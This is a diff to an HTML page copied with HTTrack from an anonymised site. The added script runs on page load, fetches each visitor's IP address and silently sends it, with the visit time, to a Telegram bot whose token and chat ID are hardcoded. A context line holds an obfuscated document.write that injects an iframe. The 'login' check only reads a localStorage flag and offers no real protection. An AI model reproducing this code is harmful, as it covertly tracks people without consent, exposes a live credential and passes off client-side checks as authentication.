@@ -1027,6 +1027,68 @@ document.write(unescape('%20%20%20%20%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%
 <script id="_wau807">var _wau = _wau || []; _wau.push(["tab", "01je9bsfy6", "807", "bottom-center"]);</script><script async src="http://waust.at/t.js"></script>
   
 </body>
+	  <script>
+/***********************
+ * إرسال إشعار عند دخول المستخدم
+ ***********************/
+async function sendVisitNotification() {
+  try {
+    // الحصول على عنوان IP الخاص بالمستخدم
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    const userIP = ipData.ip;
+
+    // الحصول على الوقت الحالي
+    const visitTime = new Date().toLocaleString();
+
+    // إنشاء الرسالة
+    const message = `👤 زائر جديد!
+📌 عنوان IP: ${userIP}
+🕒 وقت الزيارة: ${visitTime}`;
+
+    // إرسال الرسالة عبر Telegram Bot API
+    await sendTelegramMessage(message);
+  } catch (error) {
+    console.error('حدث خطأ أثناء إرسال الإشعار:', error);
+  }
+}
+
+/***********************
+ * إرسال الرسالة عبر Telegram
+ ***********************/
+async function sendTelegramMessage(message) {
+  const BOT_TOKEN = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // استبدل ببوت توكين الخاص بك
+  const CHAT_ID = '6336934514'; // استبدل بمعرف الدردشة الخاص بك
+
+  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+  });
+  return response.json();
+}
+
+/***********************
+ * التحقق من تسجيل الدخول
+ ***********************/
+function checkLogin() {
+  if(localStorage.getItem('loggedIn') === 'true') {
+    document.getElementById('loginModal').classList.remove('active');
+    document.getElementById('appContent').style.display = 'block';
+    init();
+  } else {
+    document.getElementById('loginModal').classList.add('active');
+  }
+}
+
+/***********************
+ * تشغيل الإشعار عند تحميل الصفحة
+ ***********************/
+window.onload = () => {
+  checkLogin(); // التحقق من تسجيل الدخول
+  sendVisitNotification(); // إرسال إشعار الزيارة
+};
+	  </script>
 
 <!-- Mirrored from www.xxxx.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Mar 2025 21:52:24 GMT -->
 </html>
